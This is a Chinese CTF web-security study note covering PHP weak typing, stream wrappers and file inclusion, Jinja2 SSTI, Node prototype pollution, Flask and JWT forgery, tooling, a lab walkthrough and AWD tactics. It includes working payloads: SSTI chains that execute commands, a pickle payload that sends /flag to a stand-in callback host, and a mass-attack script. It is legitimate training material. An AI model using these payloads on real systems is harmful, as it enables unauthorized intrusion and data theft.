# 36 - CTF Web 方向：题型体系、语言特性与实战

> 日期：2026-11-04
> 所属大纲阶段：7. CTF 实战（Web 方向）
> 参考资料：
> - CTF Wiki Web 章节（ctf-wiki.org）
> - PHP 官方手册（php.net）：类型比较表、伪协议章节
> - PayloadsAllTheThings（github.com/swisskyrepo/PayloadsAllTheThings）
> - OWASP Web Security Testing Guide（OWASP WSTG）
> - Flask 官方文档与 Jinja2 官方文档（jinja.palletsprojects.com）
> - 各平台真题：picoCTF / BUUCTF / 攻防世界 Web 区

> **合规声明**：本文全部技术仅限 **CTF 靶场环境**（picoCTF、BUUCTF、攻防世界、本地 docker 靶场等）使用，禁止对任何未授权系统实施。

---

## 目录

1. [Web 题总体特点与基础回顾](#1-web-题总体特点与基础回顾)
2. [题目分类树](#2-题目分类树)
3. [PHP 特性专题（重中之重）](#3-php-特性专题重中之重)
4. [SSTI 模板注入详解](#4-ssti-模板注入详解)
5. [Node.js 专题：原型链污染](#5-nodejs-专题原型链污染)
6. [Python 框架专题](#6-python-框架专题)
7. [JWT 题汇总](#7-jwt-题汇总)
8. [Nginx/Apache 配置题](#8-nginxapache-配置题)
9. [Web 工具箱](#9-web-工具箱)
10. [完整例题 Walkthrough](#10-完整例题-walkthrough)
11. [AWD 攻防专题](#11-awd-攻防专题)
12. [复盘模板](#12-复盘模板)
13. [自测问题](#13-自测问题)

---

## 1. Web 题总体特点与基础回顾

**Web 方向**是 CTF 参与人数最多的方向：入门门槛低（一个浏览器），但天花板高（代码审计 + 语言底层）。题目通常给一个网址或源码包（有时要靠目录扫描挖出源码），目标是拿到 flag。

CTF Web 题与真实世界的差别：漏洞往往**刻意埋设且密集**（一题可能同时有弱类型 + 文件包含），并且偏爱**语言/框架特性**（PHP 弱类型、Flask session、JS 原型链）这类真实业务中少见的知识点。

前置知识回顾（本工作区阶段 3 各篇 + HTTP 基础）：

- HTTP 请求方法、状态码、头部字段（Cookie/Referer/X-Forwarded-For）
- 同源策略与 Cookie 属性
- SQL 注入 / XSS / CSRF / SSRF / 文件上传 / 反序列化 —— 本文不再重复原理，只讲 CTF 变体

---

## 2. 题目分类树

```mermaid
flowchart TD
    ROOT["CTF Web 题"]
    ROOT --> LEAK["信息泄露"]
    ROOT --> INJ["注入类"]
    ROOT --> LOGIC["逻辑漏洞"]
    ROOT --> FW["框架与语言特性"]
    ROOT --> PROTO["协议与认证"]
    LEAK --> LEAK1["源码泄露：.git（githack 恢复）、.svn、.DS_Store、备份文件（index.php.bak、www.zip）"]
    LEAK --> LEAK2["目录扫描发现隐藏路径（admin、flag、test）"]
    LEAK --> LEAK3["注释泄露：HTML 注释、JS 文件中的 api/密钥、robots.txt"]
    LEAK --> LEAK4["崩溃信息/报错回显、phpinfo"]
    INJ --> INJ1["SQL 注入（union/报错/布尔盲注/时间盲注/堆叠、waf 绕过）"]
    INJ --> INJ2["命令注入（command injection：system/exec/passthru + 空格/关键字绕过）"]
    INJ --> INJ3["SSTI（模板注入，见第 4 节）"]
    INJ --> INJ4["XSS（CTF 中多为偷 admin cookie 的 bot 交互题）"]
    INJ --> INJ5["XPath/LDAP/NoSQL 注入（MongoDB：password[$ne]=1）"]
    LOGIC --> LOGIC1["越权（水平/垂直：改 id 参数）"]
    LOGIC --> LOGIC2["任意用户操作/条件竞争（race condition：并发请求）"]
    LOGIC --> LOGIC3["数字精度（PHP 浮点、JS 相等）"]
    LOGIC --> LOGIC4["业务逻辑（0 元购、负数、改包重放）"]
    FW --> FW1["PHP 特性（第 3 节）"]
    FW --> FW2["Python/Flask/Django（第 6 节）"]
    FW --> FW3["Node/Express/JS（第 5 节）"]
    FW --> FW4["Java 反序列化/JSP（进阶，概念见阶段 3）"]
    PROTO --> PROTO1["HTTP 方法/头部认证绕过（Client-IP、基本认证、HTTPonly 偷取变体）"]
    PROTO --> PROTO2["JWT/Session（第 7 节）"]
    PROTO --> PROTO3["SSRF + 内网/gopher:// 打内网服务"]
    PROTO --> PROTO4["CORS/JSONP、条件请求"]
```



---

## 3. PHP 特性专题（重中之重）

PHP 是国内 CTF Web 的绝对主力语言，大量考点源于其**历史包袱与松散类型系统**。以下全部内容仅用于 CTF 靶场。

### 3.1 弱类型比较 `==` 的坑

PHP `==`（松散比较）会在比较前做类型转换（**类型戏法，Type Juggling**），`===` 才是比较值且比较类型。经典坑表：

| 表达式（PHP） | 结果 | 原因 |
| ---- | ---- | ---- |
| `"abc" == 0` | `true`（PHP<8） | 非数字开头字符串转数字为 0 |
| `"1abc" == 1` | `true` | 前导数字截取 |
| `"0e123" == "0e456"` | `true` | **科学计数法**：两边都被解析为 `0×10^123 = 0` |
| `"0x1A" == 26` | `true`（PHP<7.0） | 十六进制字符串转数字（7.0 移除） |
| `null == false` / `null == 0` / `null == ""` | 全 `true` | null 与几乎一切弱相等 |
| `"" == false == 0 == null` | 全相等 | 「空值全家桶」 |
| `123 == "123abc"` | `true` | 同前导数字截取 |

**科学计数法（0e）碰撞**是最高频考点：如果代码用 `md5($input) == $your_hash` 且哈希恰好是 `0e` 开头全数字，则传入任何 `0e` 开头哈希的明文即可。经典 magic hash：

- `md5("240610708") = 0e462097431906509019562988736854`
- `md5("QNKCDZO")   = 0e830400451993494058024219903391`
- sha1 同理：`sha1("aaroZmOk") = 0e66507019969427134894567494305185578764`

### 3.2 md5/sha1 碰撞与数组绕过

```php
if (md5($a) == md5($b) && $a !== $b) { /* flag */ }
```

两条路：

1. **0e 碰撞**：`$a=240610708, $b=QNKCDZO`（仅当用 `==`）；
2. **数组绕过**：`md5()` 参数必须是字符串，传数组返回 `null`（并 warning，CTF 环境 warning 一般不致命）：
   - `?a[]=1&b[]=2` → `md5(array) == md5(array)` → `null == null` → `true`，而 `$a !== $b`（两个不同数组）成立；
   - `===` 比较时同样有效：`md5([]) === md5([1])` 都是 `null`。注意 `[] === [1]` 为 false，满足 `$a !== $b`。
   - sha1 同理：`?a[]=1&b[]=2`。

相关考点：`strcmp($a, $password) == 0` → 传数组 `?a[]=1` 时 `strcmp` 返回 `null`，`null == 0` 成立（见 3.3）。

### 3.3 strcmp 数组绕过

```php
if (strcmp($_GET['pass'], $flag) == 0) { echo $flag; }
```

PHP 5.3+ 中 `strcmp` 收到数组返回 `null`，`null == 0` 为 true：`?pass[]=1` 拿 flag。

### 3.4 in_array 松散模式

```php
$whitelist = [1, 2, 3];
in_array($_GET['id'], $whitelist)   // 松散：传 "1任意串" 时 "1xxx"==1 → true
in_array($_GET['id'], $whitelist, true)  // 严格模式安全
```

注意版本语义：PHP 8 中前导数字字符串与 int 的弱比较**仍按数值**（`"1xxx"==1` 仍为 `true`）；8.0 起改变的是**非数字**字符串与数字的比较（`"abc"==0` 由 `true` 变 `false`）。

利用场景：白名单校验用松散比较时，`"1' union select ..."` 可能通过校验（`== 1` 成立）后进入 SQL。

### 3.5 preg_replace `/e` 修正符（历史问题）

PHP < 5.5（5.5 废弃、7.0 移除）中 `preg_replace('/pattern/e', 'replacement', $subject)` 会把 replacement 当 **PHP 代码执行**：

```php
preg_replace('/(.*)/e', '\\1', $_GET['cmd']);  // GET ?cmd=phpinfo(); → 执行
```

老版本 PHP（<5.5）环境的老题专属，见到 `/e` 直接往代码执行方向构造。

### 3.6 变量覆盖：extract() 与 `$$`

**extract()**：把数组键名变成变量：

```php
// <?php $flag = 'real_flag_here'; extract($_GET); ...
// ?flag=x 只覆盖为已知值；典型题是把 $flag 覆盖后 bypass 如 extract($_GET) 之后再 if($pass==$token)
```

典型利用：题目先 `extract($_GET)` 再比较两个变量，传入相同值使二者相等。

**`$$` 可变变量（程序逻辑漏洞经典）**：

```php
// <?php foreach ($_GET as $key => $value) { $$key = $value; }
// 之后使用 $flag/$auth 等变量 → 传 ?flag=1&auth=1 直接覆盖任意变量
```

这是 `register_globals`（PHP 5.4 移除的历史特性：GET 参数自动变全局变量）的精神续作，见到 `$$` 循环赋值必是变量覆盖题。

### 3.7 PHP 伪协议大全

PHP 流包装器（Stream Wrappers），文件操作函数（`include`/`file_get_contents`/`fopen` 等）可用：

| 协议 | 用途 | 关键参数 |
| ---- | ---- | ---- |
| `php://filter` | 读源码（见下详解）、filter 链 RCE | `read`/`write` + `convert.*` |
| `php://input` | 读 POST 原始 body；配合 `include` 时 POST 即代码 | 需 `allow_url_include=On` |
| `data://` | 数据流协议：`data://text/plain;base64,PD9waHA=` | 同上 |
| `phar://` | phar 归档流，**触发反序列化**（见下） | 配合上传 .phar/.jpg（phar://x.jpg/xx.txt） |
| `zip://` | 读 zip 内文件：`zip://a.zip%23shell.php` | 需绝对路径 |
| `file://` | 访问本地文件系统 | 默认可用 |
| `http(s)://` | 远程文件（RFI 前提 allow_url_include） | — |

**php://filter 读源码原理**：`include` php 文件会执行不回显，但用过滤器**先 base64 编码**再「包含」，编码后的字符串不是合法 php，会被原样输出：

```
php://filter/read=convert.base64-encode/resource=flag.php
→ 输出 PD9waHAgJGZsYWc9...，base64 -d 得源码
```

常用过滤器组合：`convert.base64-encode`、`convert.iconv.UCS-2LE.UCS-2BE`（配合 iconv 链做字符变换）、`zlib.deflate`/`zlib.inflate`、`string.rot13`。**filter 链 RCE**（iconv filter 链构造任意字符 → 写临时文件）：进阶考点，见 p神（phith0n）相关文章，此处预告即可。

**phar:// 反序列化联动**：`file_exists("phar://x.jpg/1.txt")` 等文件函数会反序列化 phar 的 metadata。注意：`phar.readonly` 默认 **On**，但它只限制本地**生成** phar 文件；用 `phar://` 流读取触发反序列化不受此限（生成 phar 时临时开启即可）。把构造好的对象序列化进 phar 的 metadata，上传后用 phar:// 触发魔术方法（`__destruct`/`__wakeup`）。

### 3.8 文件包含 LFI/RFI 与绕过

**本地文件包含（Local File Inclusion, LFI）**：`include($_GET['page'])` 只拼本地路径；**远程文件包含（Remote File Inclusion, RFI）**：允许 URL（需 `allow_url_include=On`，默认 Off）。

常用包含目标：

```
?file=../../../../etc/passwd          # 路径穿越
?file=php://filter/...resource=index.php
?file=/var/log/nginx/access.log       # 日志包含（UA 写入一句话再包含）
?file=/tmp/sess_xxx                   # session 包含（session 内容可控时）
```

**绕过拼接**（代码常拼前缀/后缀，如 `include($_GET['f'].'.php')`）：

| 限制 | 绕过 | 说明 |
| ---- | ---- | ---- |
| 后缀 `.php` | `%00` 截断 | PHP < 5.3.4 且 magic_quotes_gpc=Off，**历史问题** |
| 后缀 `.php` | 超长点号 `................`（Windows）或超长路径 | 路径长度上限截断，老 Windows 题 |
| 前缀 `./dirs/` | `../` 穿越抵消 | 数一下层数 |
| 关键字过滤 `../` | `....//` 双写、url 编码 `%2e%2e%2f` | 视过滤实现 |
| 都不行 | 伪协议绕过后缀（filter 读源码） | `resource` 不受后缀影响时 |

> 本节是速查版；原理、六条 RCE 升级路径、DVWA 四级源码审计与防御专章见阶段 3 的《48-文件包含-LFI-RFI》。

### 3.9 disable_functions 绕过与 open_basedir（概念级）

拿到代码执行（如 `eval`）但命令函数被 `disable_functions` 禁掉（system/exec/shell_exec/passthru/popen/proc_open 全禁）时：

- **LD_PRELOAD + mail()**：`mail()` 内部调用 `sendmail` 子进程，用 `putenv("LD_PRELOAD=...")` 加载自己的 so 劫持子进程（经典：bypass_disablefunc 菜刀插件/蚁剑插件）；
- **FFI（PHP 7.4+）**：`$ffi = FFI::cdef("int system(const char *command);")` 直接调 libc，需 ffi.enable=true；
- 其他：imap_open、ImageMagick/imagick 组件漏洞、pcntl_exec、Windows COM 组件等——按环境逐个试；
- 工具：蚁剑（antSword）的「绕过 disable_functions」插件自动尝试多种方案。

**open_basedir 限制目录**绕过：`ini_set('open_basedir','..')` 配合 `chdir` 相对路径穿越（经典 Glob:// 或 ini_set 链）；概念级掌握「遇到 basedir 限制先想到 ini_set+chdir 绕过」即可。

### 3.10 反序列化 pop 链（索引）

PHP 反序列化（`unserialize`）与 POP 链（Property-Oriented Programming）构造在阶段 3 反序列化篇已有原理，CTF 变体：phar 触发（3.7）、`__wakeup` 绕过（属性个数大于实际：`O:4:"Test":2:` 当实际 1 个属性，CVE-2016-7124）、字符串逃逸（替换导致长度变化的过滤器）。详见阶段 3 对应笔记，此处索引。

---

## 4. SSTI 模板注入详解

**模板注入（Server-Side Template Injection, SSTI）**：用户输入被拼接进模板**渲染**而非当作数据：

```python
# 危险写法：render_template_string(user_input)
render_template_string("Hello " + name)   # name={{7*7}} → 回显 Hello 49
# 安全写法：render_template_string("Hello {{name}}", name=name)
```

### 4.1 检测：表达式探测表

输入探测表达式，看回显：

| 输入 | 回显 | 模板引擎 |
| ---- | ---- | ---- |
| `{{7*7}}` | `49` | **Jinja2**（Python）/ Twig 可能 |
| `{{7*'7'}}` | `7777777` | Jinja2（Python 字符串乘法） |
| `${7*7}` | `49` | FreeMarker（Java）/ Mako |
| `<%= 7*7 %>` | `49` | ERB（Ruby） |
| `{{7*'7'}}` | `7777777`（Jinja2）/ 报错（Twig） | **Twig**：`{{7*7}}` 出 49 与 Jinja2 相同；`${7*7}` 求值得 49 可排除 Twig/Jinja2；用 `{{7*'7'}}` 区分——Jinja2 得 `7777777`、Twig 报错 |
| `#set($x=7*7)$x` | `49` | Velocity（Java） |
| `{{constructor.constructor("return 1")()}}` | `1` | 前端模板（客户端 SSTI，Angular 类） |

区分顺口溜：`${}` 先 Java 系（FreeMarker/Velocity），`{{}}` 先 Python Jinja2；再用 `7*'7'` 二分。

### 4.2 Jinja2 利用：从探测到 RCE

以下链在 **CTF 靶场环境**中演示。思路：Python 一切皆对象 → 沿 `__class__` → `__mro__`/`__base__` 爬到 `object` → 找 `os._wrap_close` 这类拥有 `__globals__['system']` 的类 → 调 `system`。

第一步：确认对象链

```text
{{ ''.__class__ }}          → <class 'str'>
{{ ''.__class__.__mro__ }}  → (<class 'str'>, <class 'object'>)
```

`__mro__`（Method Resolution Order，方法解析顺序）是继承链元组。第二步：取 object 的所有子类找目标：

```text
{{ ''.__class__.__mro__[1].__subclasses__() }}
→ 长列表：[<class 'type'>, ..., <class 'os._wrap_close'>, ...]
```

第三步：记下 `os._wrap_close` 的下标（假设 132，各环境不同），其 `__init__.__globals__` 里有 `os` 模块的 `system`：

```text
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat /flag') }}
```

替代链（不同环境可用性不同，都要会）：

```text
# config 对象（Flask 环境常在）：
{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
# lipsum：
{{ lipsum.__globals__['os'].popen('cat /flag').read() }}
# url_for / get_flashed_messages（Flask 全局函数）：
{{ url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()") }}
```

> 注意：Python 沙箱常见过滤 `['` `]` `__` 等，绕过手法：`|attr()` 过滤器、`|join` 拼接、`request.args` 外带参数、十六进制/unicode 编码、`` 盲注。经典文章「Python 格式化字符串与 SSTI 绕过」系列。

### 4.3 工具

- **tplmap**：`python2 tplmap.py -u "http://target/?name=*"`（`*` 标注入点），自动识别引擎并打 RCE；
- **Fenjing**：`python -m fenjing console --url ... --interactive`，专攻 Jinja2 WAF 绕过的自动化利用（中文社区出品，对新题友好）。

---

## 5. Node.js 专题：原型链污染

### 5.1 原理

JavaScript 每个对象有 `__proto__`（指向构造函数的 prototype）。读取 `obj.xxx` 时若自身无该属性，沿原型链向上找；而**写入** `obj.__proto__.xxx` 会改写其构造函数的原型，影响**所有由该构造函数创建的对象**。

```js
// merge 递归合并（常见于 "clone/default 配置合并" 库）：
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);      // 递归：key 为 "__proto__" 时进入原型
    } else {
      target[key] = source[key];
    }
  }
}
const a = {};
merge(a, JSON.parse('{"__proto__": {"isAdmin": true}}'));  // 污染 Object.prototype
console.log({}.isAdmin);  // true —— 新对象全部"继承"了 isAdmin
```

`Object.assign` 是**浅拷贝**不递归，通常不会污染（`Object.assign({}, user)` 只复制一层，`__proto__` 作为键赋值时是定义属性而非走 setter——除非用 `Object.defineProperty` 场景）；真正高危的是**递归 merge/clone 库**（老版本 lodash `_.merge`、lodash `_.set` 等）。

### 5.2 CTF 利用模式

- 题目把用户 JSON **merge 进配置对象**，之后某处判断 `config.admin` / `options.isAdmin` → 污染原型使判断为真；
- 配合 `child_process`：污染 `{exec: ...}` 类默认参数或 `NODE_OPTIONS` 环境变量（`{"__proto__": {"argv0": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}` 类经典 payload——按题逐抄，理解「污染后某处会用它拼命令」这一本质）；
- **child_process 危险点**：`child_process.exec(cmd)` 走 shell，cmd 可控即 RCE；`execFile` 传 `shell: true` 同理。

### 5.3 vm 沙箱逃逸（概念）

Node `vm` 模块不是安全沙箱（官方文档明确），`this.constructor.constructor('return process')().exit()` 一类经典逃逸；新题用 `vm2`（已被曝多个逃逸 CVE，按版本找现成 payload）。见到「在线运行 JS」类题目直接往沙箱逃逸方向查版本。

---

## 6. Python 框架专题

### 6.1 Flask session 伪造

Flask 默认 session 存在**客户端 Cookie**里，格式：`base64(数据).时间戳.签名`——内容**可读可改**，只有签名防篡改。若能拿到 SECRET_KEY（源码泄露、弱口令、信息泄露），即可伪造 admin session。

工具 **flask-unsign**：

```bash
# 仅限 CTF 靶场环境
pip install flask-unsign
flask-unsign --decode --cookie "eyJhZG1pbiI6ZmFsc2V9..."      # 解码看内容
flask-unsign --unsign --cookie "<cookie>" --wordlist /usr/share/wordlists/rockyou.txt
                                                              # 弱密钥爆破
flask-unsign --sign --cookie "{'admin': True}" --secret "key"  # 拿到 key 后伪造
# 之后用 JS document.cookie 或 Burp Repeater 替换 cookie 刷新
```

签名流程理解：HMAC(SHA1, secret, base64(payload)+时间戳)——所以**没有 key 只能爆破不能凭空伪造**；见到 session 可解码的 Flask 题第一反应就是找 key。

### 6.2 pickle 反序列化联动

Python `pickle.loads` 用户可控 = RCE（构造 `__reduce__` 返回 `os.system` 的对象）：

```python
import pickle, base64, os
class P:
    def __reduce__(self):
        return (os.system, ("curl http://your-callback/?c=$(cat /flag | base64)",))
print(base64.b64encode(pickle.dumps(P())))   # 靶场内回连自己的服务器验证
```

常与「session 用 pickle 序列化存储」（老 Flask/自定义 session）或题目 API 传 base64 pickle 结合。详见阶段 3 反序列化篇。

### 6.3 Flask debug 模式 PIN（一句话）

老版本 Flask debug 页面的 Werkzeug 控制台（console）受 PIN 保护；PIN 由 mac 地址、机器名等可预测值生成，信息收集齐可算出 PIN 进入交互控制台（CVE/技巧随版本变化，见到 `/console` 先查目标 Werkzeug 版本对应算法）。

---

## 7. JWT 题汇总

**JSON Web Token（JWT）** 原理见阶段 3 认证笔记。CTF 三大套路：

| 套路 | 特征 | 利用 |
| ---- | ---- | ---- |
| `alg: none` | header 算法为 none / 服务端不校验 | 改 payload `{admin:true}`，签名留空：`base64(header).base64(payload).` |
| 弱密钥 | HS256 签名 | `jwt2hash` + hashcat/john 爆破（`hashcat -m 16500 jwt.txt rockyou.txt`），成功后重签 |
| `kid` 注入 | header 有 kid（key id）字段且服务端用其读文件/查库 | kid 指向可控文件（`/dev/null` 空密钥、SQL 注入、命令注入视实现） |

工具：`pip install pyjwt` 手搓签验；jwt.io 肉眼解。

---

## 8. Nginx/Apache 配置题

题目直接给 `.conf` 或依赖错误配置：

- **Nginx alias 解析漏洞**：`location /files { alias /home/; }`（少斜杠）→ `/files../` 可穿越到上级目录（`/files../` 实际拼成 `/home/../`）；
- **autoindex on**：目录列表直接打开，找备份/源码；
- **Nginx 解析漏洞（历史）**：`/upload/1.jpg/x.php` 走 php-cgi `fix_pathinfo`（php.ini `cgi.fix_pathinfo=1`）把 jpg 当 php 解析（配合文件上传）；
- **Apache**：`AddHandler application/x-httpd-php .php` 与多后缀（`x.php.jpg`）；`.htaccess` 上传（`AddType application/x-httpd-php .png` 让 png 变 php，老题经典）；
- **CRLF 注入**：配置不当的反代/跳转（`location /a { return 302 https://$host$uri; }`）中 `$uri` 未编码 → `%0d%0a` 注入头。

---

## 9. Web 工具箱

| 工具 | 用途 | 常用命令/说明 |
| ---- | ---- | ---- |
| **dirsearch** | 目录扫描 | `dirsearch -u http://target -e php,html,zip -t 30`（`-e` 扩展名；重点扫 `.bak/.zip/.git`） |
| **ffuf** | 高速模糊测试 | `ffuf -u http://t/FUZZ -w /path/wordlist`（FUZZ 关键字；也扫参数 `-w words -u 'http://t/?FUZZ=1'`） |
| **hackbar**（浏览器扩展） | 快速改包/编码/常用 payload | 配合 Burp 前的手动尝试 |
| **curl** | 命令行请求 | `curl -v -X POST -d "a=1" -H "Cookie: x=1" http://t/`；`--path-as-is` 保留 `../` |
| **Python 快速起服** | 接收回连/写 PoC | `python3 -m http.server 8000`（接收文件访问）；回调验证 RCE |
| **wscat** | WebSocket 题 | `wscat -c ws://target:port` 手动发消息 |
| **GitHack / dvcs-ripper** | 恢复泄露的 .git/.svn | `python GitHack.py http://t/.git/` |
| **Burp Suite** | 万金油代理 | Repeater 改包重放、Intruder 爆破 |
| **JS 逆向** | 前端藏逻辑 | 见下 |

**JS 逆向提示（前端藏东西的套路）**：

- 找 API：devtools → Sources/Network 看前端调用了哪些隐藏接口；
- 找密钥：前端 JS 中硬编码 AES key、混淆的 token 生成逻辑（Ctrl+Shift+F 全局搜索 `key`/`secret`/`encrypt`）；
- **sourcemap 还原**：JS 末尾 `//# sourceMappingURL=app.js.map` → 下载 map 用浏览器 devtools 或 `restore-source-tree` 还原出带变量名的源码；
- webpack 打包的站看 chunk 文件（0.js/1.js）逐个翻。

---

## 10. 完整例题 Walkthrough

> **以下全程仅限 CTF 靶场环境**（仿 BUUCTF 风格教学题 `[极客大挑战 2019]` 类自编组合题，环境为本地 docker 的 PHP 7.4 + Apache）。

### 题目：PHP includes everything（教学组合题）

题面只有一句话：「Find the flag somewhere in the web root.」附件无，直接给 URL `http://靶机:8080/`。

#### 第一步：信息收集

```bash
# 目录扫描（仅限靶场）
dirsearch -u http://靶机:8080 -e php,txt,zip,bak -t 20
# 发现：
#   200  /index.php
#   200  /flag.php        （直接访问输出 "Not so easy."）
#   301  /.git/
```

有 `.git`，先恢复源码：

```bash
pip install git-dumper  # 或使用 GitHack
git-dumper http://靶机:8080/.git/ ./src
cd src && git log --oneline   # 看 commit 历史，有时 flag 在历史版本里
```

#### 第二步：审计 index.php

```php
<?php
include($_GET['page'] . '.php');
// hint.php 泄露了半截逻辑：
// if (md5($_GET['a']) == md5($_GET['b']) && $_GET['a'] !== $_GET['b']) show_next();
?>
```

两个考点连招：

1. **文件包含 + 后缀拼接 `.php`**：用 `php://filter` 读任意 php 源码（filter 协议不受拼接影响——`resource=flag` 拼上 `.php` 恰好是目标文件）；
2. **md5 数组绕过**：`a[]` 与 `b[]` 传数组 → `md5()` 返回 null 相等，`!==` 成立。

#### 第三步：读 flag.php 源码

```bash
curl "http://靶机:8080/?page=php://filter/read=convert.base64-encode/resource=flag"
# 回显：PD9waHAKICAgICRmbGFnID0gImZsYWd7ZmlsdGVyX2FuZF93ZWFrX3R5cGV9IjsKICAgIC8vIG5leHQ6IGZpbmQgdGhlIHNlY3JldCBmaWxlCg==
echo 'PD9waHAKICAgICRmbGFnID0gImZsYWd7ZmlsdGVyX2FuZF93ZWFrX3R5cGV9IjsKICAgIC8vIG5leHQ6IGZpbmQgdGhlIHNlY3JldCBmaWxlCg==' | base64 -d
# <?php
#     $flag = "flag{filter_and_weak_type}";   ← 教学环境的假 flag
#     // next: find the secret file
# ?>
```

#### 第四步：触发弱类型分支

```bash
curl "http://靶机:8080/?page=hint&a[]=1&b[]=2"
# 输出：secret file name is s3cr3t_xxx.php
curl "http://靶机:8080/?page=php://filter/read=convert.base64-encode/resource=s3cr3t_xxx"
# base64 -d 后得到最终 flag{...}
```

#### 第五步：复盘

- 考点链：`.git` 泄露 → 源码审计 → php://filter 读源码（绕过「include 执行不回显」）→ md5 数组绕过 + 弱类型；
- 识别特征：`include($x . '.php')` → 想到 filter 协议；`md5($a)==md5($b)` → 想到数组/0e；
- 迁移：下次见到「直接访问 php 文件输出固定文案」第一反应就是 filter 读源码。

---

## 11. AWD 攻防专题

### 11.1 赛制详解

**攻防赛（Attack with Defense, AWD）**：每队一台同构服务器（SSH + Web 服务），开局先**自查埋好的漏洞**。时间片轮转：

- **攻击分**：周期性（如每 5 分钟）从各队服务器读取 flag 比对，用别人的漏洞拿到的 flag 得分；flag 会定期轮换，所以**批量自动化打全场**是核心；
- **防守分**：裁判系统周期性检查己方服务可用性与 flag 文件完整性；宕机/flag 被改判负分；
- **patch（修复）**：改自己代码修漏洞。**改坏服务比不修更伤**，所以 patch 规范是「最小化修改」。

### 11.2 准备清单（赛前）

1. **备份源码**：拿到 SSH 第一时间 `tar czf backup.tgz /var/www/html` 并下载到本地；
2. **文件监控**：部署监控脚本发现被种 webshell（见下）；
3. **流量抓取**：tcpdump 抓包或日志中间件，抓到别人的攻击 payload 可以**反打全场**（AWD 最大的分差来源）；
4. **批量攻击脚本框架**：读全场 ip 列表，requests 并发提交；
5. **通用后门预备**（仅 AWD 规则允许时）：给自己留备用入口防被清（注意赛规，部分赛事禁自植入后门）；
6. 备好常见的 patch 补丁模板（SQL 注入参数化、命令注入白名单）。

### 11.3 文件监控脚本思路

```python
# 仅限 AWD 赛场：每 30 秒对比一次 web 目录哈希，发现新增/修改文件即告警并可选自动删除
import hashlib, os, time, json

WEB = "/var/www/html"
def snapshot():
    snap = {}
    for root, _, files in os.walk(WEB):
        for f in files:
            p = os.path.join(root, f)
            snap[p] = hashlib.md5(open(p, "rb").read()).hexdigest()
    return snap

base = snapshot(); json.dump(base, open("base.json", "w"))
while True:
    time.sleep(30)
    cur = snapshot()
    for p, h in cur.items():
        if base.get(p) != h:
            print(f"[!] CHANGED/NEW: {p}")          # 人工确认是被种 shell 还是轮换
    for p in base:
        if p not in cur:
            print(f"[!] DELETED: {p}")
```

### 11.4 流量还原（防守的核心收益）

- `tcpdump -i any -w traffic.pcap port 80` 持续抓包，Wireshark 里 `http.request` 过滤；
- 别人打你的 payload（比如他的 POST 注入体）直接抄下来，改 flag 提交逻辑后**批量打其他队**；
- 日志侧：nginx access log 里找 `POST /shell.php`、异常 UA。

### 11.5 批量攻击脚本（仅限 AWD 赛场）

```python
# 仅限 AWD 赛场：对全场同构服务批量提交 payload
import concurrent.futures, requests

teams = [f"192.168.{i}.1" for i in range(2, 30)]     # 按赛事给的网段
payload = {"cmd": "cat /flag"}                         # 赛中发现的漏洞参数

def attack(ip):
    try:
        r = requests.post(f"http://{ip}/vuln.php", data=payload, timeout=3)
        return ip, r.text[:100]
    except Exception as e:
        return ip, str(e)

with concurrent.futures.ThreadPoolExecutor(10) as ex:
    for ip, out in ex.map(attack, teams):
        if "flag" in out.lower():
            print(f"[+] {ip}: {out}")
```

### 11.6 patch 规范

- **最小化修改**：只改漏洞行，不重构、不动无关代码（改坏服务扣分）；
- SQL 注入 → 参数化/prepared statement；命令注入 → `escapeshellarg` 或白名单；文件包含 → `basename()+白名单`；
- 不懂的逻辑宁可「临时黑名单兜底 + 盯监控」也不要盲改；
- patch 后立刻自测功能页面可用性，并**保留原文件备份**（`index.php.bak` 放 web 目录外）。

---

## 12. 复盘模板

```markdown
### [平台-题号] 题目名（方向：Web）
- **题目信息**：题面/附件/环境（PHP 版本、框架）
- **考点**：如 php://filter + md5 数组绕过（→ 本笔记 3.2/3.7）
- **卡点**：如「不知道 filter 协议可以绕过后缀拼接，卡在 %00 截断的思路上」
- **新学知识**：新 payload/新工具/新过滤器，附最小可复现代码
- **同类题迁移**：识别特征（看到 X 特征）→ 标准动作（先做 Y 再做 Z）
```

---

## 13. 自测问题

1. PHP `"0e123"=="0e456"` 为什么成立？给出两个常用 0e 哈希明文。
2. `md5($a)===md5($b)` 且 `$a!==$b`，如何用数组一次绕过？原理是什么？
3. strcmp 收到数组时的返回值是什么？如何利用？
4. `php://filter` 读源码为什么要加 `convert.base64-encode`？
5. 列出至少 4 个 PHP 伪协议并各说一个用途；phar:// 如何触发反序列化？
6. 后缀拼接 `.php` 的包含题有哪些绕过思路（含历史方法及其版本限制）？
7. SSTI 探测：`{{7*'7'}}` 回显 `7777777` 说明是什么引擎？写出 Jinja2 从探测到执行命令的完整链路。
8. Node 原型链污染的必要条件是什么（哪种 merge 会污染）？`Object.assign` 为什么通常不行？
9. Flask session 为什么能伪造？flask-unsign 的三个子命令分别做什么？
10. JWT 的三种经典 CTF 套路及对应利用步骤？
11. Nginx alias 解析漏洞的配置长什么样？如何访问利用？
12. AWD 中「patch 规范：最小化修改」为什么重要？流量抓取的收益体现在哪里？
13. sourcemap 如何发现与还原？

---

> 上一篇：[35-CTF-入门指南.md](35-CTF-入门指南.md)　下一篇：[37-CTF-Pwn-方向.md](37-CTF-Pwn-方向.md)

---

## 附：ASCII 图 → Mermaid 替换清单

| 原 ASCII 图（小节 · 内容） | 替换后类型 |
| --- | --- |
| 「题目分类树」节 · CTF Web 题知识树（信息泄露/注入/逻辑漏洞/框架/协议认证） | flowchart TD |
